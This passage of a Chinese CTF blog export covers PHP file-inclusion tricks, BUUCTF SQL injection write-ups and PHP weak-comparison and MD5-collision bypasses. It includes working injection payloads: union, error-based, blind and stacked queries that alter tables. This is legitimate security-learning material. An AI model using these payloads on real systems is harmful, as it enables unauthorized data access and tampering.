<h2 id="require-once软连接绕过"><a href="#require-once软连接绕过" class="headerlink" title="require_once软连接绕过"></a>require_once软连接绕过</h2><p><code>require_once()</code>函数与<code>require()</code>函数功能类似，但所包含的信息只执行一次,使用这个函数可以避免相同的文件被包含多次,但是如果我们需要利用文件包含漏洞来读取源码时,如果关键文件已经被包含过了,就要想办法绕过<br><a href="https://www.anquanke.com/post/id/213235#h2-0">贴一个大佬讲解原理</a><br>说实话没怎么看懂……简单来说<br>PHP最新版的小Trick， require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含<br><strong>payload:</strong><code>/proc/self/root</code>这个代表的是根目录<br><code>/proc/self/root/proc/self/root</code>这个代表的还是根目录<br>加上很多很多的软连接,就可以绕过<code>require_once</code>,这时候还在根目录,再加上<code>/var/www/html/flag.php</code><br>许多基于 PHP 的网站都将其文件存储在 &#x2F;var&#x2F;www&#x2F;html 目录下。这是一个常用的位置</p>
<h2 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache服务器日志存放文件位置：/var/log/apache/access.log</span><br><span class="line">nginx服务器日志存放位置：/var/log/nginx/access.log和/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
<p>日志包含是属于本地文件包含,如果可以控制参数包含日志文件的话,且服务器有对应漏洞,就会产生一定的回显,可以利用这个进行命令注入(一句话木马或是直接写入命令)<br><strong>apache</strong>会存放我们的url参数在访问时回显，这使得我们可以在<code>url</code>后进行命令的注入。<br><strong>nginx</strong>可以看到回显的是ua报文头，同理，我们可以在<code>ua头</code>进行命令的注入</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>include漏洞</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buu刷题之sql注入</title>
    <url>/2023/05/23/buu%E5%88%B7%E9%A2%98%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>经过一段时间的学习,开始刷题之旅,题目都来自<a href="https://buuoj.cn/challenges">BUUCTF平台</a><br>大致分为<code>简单</code>,<code>签到</code>,<code>中等</code>三个等级(困难的还做不出~~~),每道题写个<code>wp</code></p>
<h1 id="简单难度"><a href="#简单难度" class="headerlink" title="简单难度"></a>简单难度</h1><p>简单难度大概就是新生赛的难度</p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201418.png"><br>进入靶机很容易发现是SQL注入<br>两个传参为<code>?username&amp;password</code><br>尝试丢单引号,发现报错,确定为注入点<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201708.png"><br>丢个%23(#)进去,报错消失,证明为单引号闭合<br>常规<code>group by</code>爆出3列<br>常规union注入,发现有回显!<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523202045.png"><br>无过滤,有回显,直接走流程<br><strong>pyload</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span>admin<span class="string">&#x27;union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</span></span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523205904.png"><br>进入靶机,提示有过滤<br>丢单引号,尝试丢单引号,发现报错,确定为注入点,丢个%23(#)进去,报错消失,证明为单引号闭合<br>常规<code>group by</code>发现报错<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210205.png"><br>提示表明错误发生在<code>3#</code>附近,猜测是<code>by</code>被替换为空了,尝试双写绕过,成功!(3列)<br>这边心急直接丢进去查表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
<p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210905.png"><br>这个报错非常明显了,也是替换成空格,对比payload和报错信息,少掉的部分就是被过滤的<br>过滤的关键词有<code>union</code>,<code>select</code>,<code>from</code>,<code>or</code>,<code>where</code>,<code>from</code>,<code>and</code><br>其他非常常规的走流程<br><strong>payload</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27;uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql%23</span></span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>和前两题是一样的,找到注入点,判断单引号闭合<br>丢入<code>group by 3</code>时,提示<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523212047.png"><br>明显是有东西触发过滤了(被发现了)<br>尝试写成<code>group b</code>,还是不行<br>尝试写成<code>grou b</code>,还是不行<br>单传一个空格,发现还是被逮住了,看来是过滤了空格,那我们直接<a href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">上连接</a><br>找到一个<code>%A0</code>可以代替空格且没有过滤!<br>那尝试union注入,结果发现,union被过滤了…<br>那就直接上报错注入(无空格版)<br><code>and(1=extractvalue(100,concat(0x7e,(插入以下语句))))</code><br>还是被逮住,可能是and被过滤,删掉and,还是被逮住,可能是<code>=</code>被过滤<br>感觉出题人故意留了个后面一样…..<code>or</code>没有被过滤,其实想想也可以知道,要是<code>or</code>被过滤了,那<code>information_schema</code>也用不了<br>那就<code>?username=admin&amp;password=admin&#39;or(extractvalue(100,concat(0x7e,(database()))))%23</code>成功爆出<br>上payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or(extractvalue(100,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))))))%23</span></span><br></pre></td></tr></table></figure>
<p>这里要知道<code>a=b</code>可以用<code>(a)like(b)</code>绕过<br>前面都还常规,逐渐报表名,爆列名,到最后一步<br><code>&#39;or(extractvalue(100,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)))))%23</code><br>得到<code>~1flagflag&#123;1669770e-dd70-4617-9f</code>,flag出来了一半,因为报错注入的字数是有限制的<br>尝试使用<br><code>select(substring(group_concat(password),1,30))from(H4rDsq1)</code><br>居然还是被逮住了,看来是过滤了<code>substring</code>,那就<a href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#substring%E8%BF%87%E6%BB%A4">上链接</a><br>使用<code>right</code>代替<code>substring</code><br>另一半flag出来的payload:<br><code>&#39;or(extractvalue(100,concat(0x7e,(select(right(password,30))from(H4rDsq1)))))%23</code></p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>呃呃,这道题考了多种加密方式,没见到过真是令人头疼<br>关于SQL这边考了一个<a href="https://shuimao.xyz/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/#Union%E6%9F%A5%E8%AF%A2">临时虚拟表</a>的知识点<br>mysql有这样的一个特性<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230524123352.png"></p>
<p>重新回到这个题目上,题目名已经指明了是sql,进去是个简单的表单,根据我个人的习惯,先丢两个<code>admin</code>进去看看<br>这边提示<code>wrong pass!</code>,用post传参<code>name&amp;pw</code></p>
<p>没啥思路,就尝试找注入点,最后再参数<code>name</code>丢入单引号引起报错,证明这边存在注入点,且可以闭合<br>然后尝试常规注入,发现<code>do not hack me!</code>,看来是有过滤</p>
<p>试了一下,<code>or</code>,<code>圆括号</code>,<code>=</code>被过滤,而且没有回显,虽然<code>or</code>可以大写绕过,<code>=</code>可以用<code>like</code>绕过,但是括号被过滤了…..报错注入肯定要括号,盲注要括号,union注入没回显,好吧,常规思路全部不行</p>
<p>那就只能,看一下源代码,抓一下包看看有没有提示了<br>果然,源码有提示<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230524125605.png"><br>但是被加密过了………………..见得太少了,不知道什么加密,去搜wp,原来是<code>base32</code><br>解码后<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230524130220.png"><br>还是加密过的,但是这个比较眼熟,应该是<code>base64</code>,解码后得到<br><code>select * from user where username = &#39;$name&#39;</code><br>说实话看着还是有点懵,是想提示我们,账号和密码是分别查询的吗<br>再看看页面<code>wrong pass!</code>,有可能<code>admin</code>就是正确的账号<br>把<code>admin</code>改成<code>ad</code>,提示<code>wrong user!</code>,那应该就是了,账号密码是两个查询语句,先查询有没有这个账户,如果有就查询密码,如果密码正确就登入,应该是这样的一个思路<br>我们利用创建虚拟表的特性,可以给表中增加一条数据<code>admin</code>:<code>123</code>,同时传入密码,就可以成功登入了<br>通过select逐渐添加列数,可以知道一共是有三列,这时候我们需要判断,哪一列是账号,哪一列是密码(猜测为<code>id</code>,<code>username</code>,<code>password</code>的常见结构)<br>如果账号在错误的位置,会提示<code>wrong user!</code>,在正确的位置会提示<code>wrong pass!</code>,最后测出账号是第二列<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230525194014.png"><br>payload<br><code>name=1&#39;union select 1,&#39;admin&#39;,&#39;123&#39;#&amp;pw=123</code>没想到不对!!!<br>最后查阅wp才知道,这个密码经过了<strong>md5加密</strong>…,所以我们表中的数据也要是md5加密过的才能对得上<br>所以最终的<strong>payload</strong>是<br><code>name=1&#39;union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code></p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>进入界面,提示表名和字段名都是<code>flag</code>,只需要知道<code>id</code>就可以拿到了,传参就是<code>id</code><br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230525194737.png"><br>简单提交一下,<code>&#39;</code>,发现提示<code>bool(false)</code>,警觉,一下就要想到布尔盲注<br>然后试着<code>#</code>闭合一下,提示<code>SQL Injection Checked.</code>有过滤,测试了一下<code>空格</code>也被过滤了<br>那就试一下简单的数字<code>1</code>,<code>2</code>,发现是有结果的,输入其他字符都是提示<code>bool(false)</code><br>那就试一下盲注吧(ps:其实可以布尔盲注的大部分都可以时间盲注,除了if被过滤的时候)<br>这里不知道什么闭合,但是注释符被过滤的情况下,会优先考虑一下是不是数字型(没有闭合)<br>尝试payload<code>id=if(1=1,sleep(2),0)</code>,页面转圈圈,果然,存在注入点,且无闭合<br>虽然时间盲注也可以做,但是按效率来说,还得是我布尔盲注,<a href="https://shuimao.xyz/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">上脚本!</a>,这里用到异或法实现真假的转化<br>payload:<code>id=0^(ascii(substr((select(database())),1,1))&gt;100)</code>,如果<code>ascii</code>条件为真,那就是<code>0^1</code>,结果还是1,这时候就会显示<code>Hello, glzjin wants a girlfriend.</code>,<code>ascii</code>条件为假,那就是<code>0^0</code>,结果为0,这时候显示<code>Error Occured When Fetch Result.</code><br>因为表名和字段名已经知道了,直接使用无空格转态脚本跑就行<br><strong>payload</strong>(这里group被过滤了,直接去掉就行)<br><code>id=0^(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)</code></p>
<h1 id="签到难度"><a href="#签到难度" class="headerlink" title="签到难度"></a>签到难度</h1><p>签到难度大概是一般比赛的常规题</p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>进入界面<img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230525215719.png"><br>丢个单引号试试,结果出现报错,丢入<code>%23</code>,恢复正常,存在注入点,且为单引号闭合<br>常规<code>union select</code>,结果提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>这个是一个正则表达,表示过滤了<code>select</code>,<code>update</code>,<code>delete</code>,<code>drop</code>,<code>insert</code>,<code>wher</code>,<code>.</code><br><code>/i</code>表示不区分大小写,常规的注入,遇到过滤<code>select</code>就完全行不通了,一般select被过滤最先想到的就是<a href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">堆叠注入</a>,当然也还要<a href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5">mysql8.0新特性</a>这样的考点<br>这边尝试堆叠注入,发现可行<br>用常规的堆叠注入的思路就能做,这边要注意的是,使用<code>?inject=1&#39;;show tables;%23</code>爆出的表名是<code>1919810931114514</code>,这边需要使用一对反引号进行包裹`,才能正常查询</p>
<p>还有一种非常规思路,因为页面提供了一个可以查询数据库的语句,只要我们利用堆叠注入mysql语句,将需要查的表和字段名改成已有的表和数据名<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230525221409.png"><br><strong>payload</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>BuuCTF刷题</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>BuuCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP弱类型比较绕过</title>
    <url>/2023/05/29/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP是一种弱类型语言,这意味着变量的类型是根据上下文自动推断的,不需要强调声明(如c语言),带来方便的同时,也带来了许多安全隐患<br>PHP的比较也分为弱类型(<code>==</code>)比较和强类型(<code>===</code>)比较,还有(<code>!=</code>)和(<code>!==</code>)</p>
<h1 id="md5比较绕过"><a href="#md5比较绕过" class="headerlink" title="md5比较绕过"></a>md5比较绕过</h1><p>在ctf赛题中,经常会出现类似于这样的一段代码,要求我们传入两个参数的值不同,而<code>md5()</code>后的值相同</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!=<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) ==<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0e等于0绕过"><a href="#0e等于0绕过" class="headerlink" title="0e等于0绕过"></a>0e等于0绕过</h2><p>一个字符串经过md5处理后如果是以<code>0e</code>开头的,那么在php中就会被认为是科学计数法表示的数字(在科学计数法中，<code>e</code>或<code>E</code>用于表示指数。例如，数字300可以表示为<code>3e2</code>或<code>3E2</code>，意思是<code>3 × 10^2</code>同样，数字0.003可以表示为 <code>3e-3</code> 或 <code>3E-3</code>，意思是 <code>3 × 10^-3</code>),也就是说<code>0e</code>开头的表示的数字为<code>0 × 10^n</code>都为0,这样一来,就可以成功绕过比较</p>
<p>下面是常见的md5后为<code>0e</code>开头的字符串<br><code>QNKCDZO</code>  &#x3D;&gt;md5 <code>0e830400451993494058024219903391</code><br><code>s878926199a</code>  &#x3D;&gt;md5 <code>0e545993274517709034328855841020</code><br><code>0e215962017</code> &#x3D;&gt;md5 <code>0e291242476940776845150308577824</code></p>
<p>需要注意的是,这种绕过手法只适用于弱类型比较,强类型比较是不能使用这种方式的<br>还有一种题目,是上面题目的变种,希望传入参数的值与其本身<code>md5()</code>处理过的值相同</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里只要一个字符是以<code>0e</code>开头,<code>md5</code>后还是<code>0e</code>开头即可<br><code>0e215962017</code> &#x3D;&gt;md5 <code>0e291242476940776845150308577824</code></p>
<h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p><code>md5()</code>函数期望的得到的是一个字符串,但是如果传入一个数组的话,函数会报出一个警告,并返回<code>NULL</code>值<br>当我们传入两个不同的数组,参数值必然不相等,而经过md5处理后,其值为<code>NULL</code>,<code> **payload**</code>?a[]&#x3D;1&amp;b[]&#x3D;2&#96;</p>
<h2 id="原生类绕过"><a href="#原生类绕过" class="headerlink" title="原生类绕过"></a>原生类绕过</h2><p>如果在类中进行比较一般是无法通过数组进行绕过的,这时候可以配合反序列化中的原生类技巧绕过,<a href="http://shuimao.xyz/2023/04/23/%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7">原生类绕过</a></p>
<h2 id="哈希冲突绕过"><a href="#哈希冲突绕过" class="headerlink" title="哈希冲突绕过"></a>哈希冲突绕过</h2><p>MD5 是一种哈希算法，它将任意长度的输入数据映射到固定长度（128 位）的输出。由于 MD5 算法的输出长度是固定的，而输入数据的长度是任意的，所以理论上必然存在两个不同的输入数据，它们的 MD5 哈希值相同。</p>
<p>但是一般这些字符中都有一些不可见字符,所以这里采用url编码<br><code>$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</code></p>
<p><code>$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code><br>这两个字符串即是哈希冲突的两个字符串</p>
<h1 id="字符串与数字之间的弱类型"><a href="#字符串与数字之间的弱类型" class="headerlink" title="字符串与数字之间的弱类型"></a>字符串与数字之间的弱类型</h1><h2 id="字符强转为数字"><a href="#字符强转为数字" class="headerlink" title="字符强转为数字"></a>字符强转为数字</h2><p>php在做匹配和比较时候，会根据匹配的类型做类型转换，例如比较数字和字符串是否相等,就会进行转换,转换规则是前面的数字不变后面字母被当成字符型舍去<br>简单来说,在php中<br><code>123</code>&#x3D;&#x3D;<code>123a</code><br><code>6asdijbsujy</code>&#x3D;&#x3D;<code>6</code><br>后面的字符会被舍去,只比较最前面的数字</p>
<h2 id="字符串被解析成十六进制"><a href="#字符串被解析成十六进制" class="headerlink" title="字符串被解析成十六进制"></a>字符串被解析成十六进制</h2><p>本来应该输入的是字符串,但是以<code>0x</code>开头的字符串在进行一些比较或运算时,就被php当做16进制数进行解析了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hex</span> = <span class="string">&#x27;0xdeadc0de&#x27;</span>;</span><br><span class="line"><span class="variable">$dec</span> = <span class="number">3735929054</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$hex</span> ==<span class="variable">$dec</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;OKKK&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ps:在php中使用<code>dechex()</code>将十进制数转换为十六进制数,使用<code>hexdec()</code>将十六进制数转换为十进制数<br>对字符串进行十六进制编码解码可以用下面的脚本,<code>hex2bin</code>将十六进制数转化为二进制字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexEncode</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexDecode</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line"><span class="variable">$encoded</span> = <span class="title function_ invoke__">hexEncode</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$decoded</span> = <span class="title function_ invoke__">hexDecode</span>(<span class="variable">$encoded</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始字符串: <span class="subst">$str</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;编码后的字符串: <span class="subst">$encoded</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;解码后的字符串: <span class="subst">$decoded</span>\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PHP</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
</search>
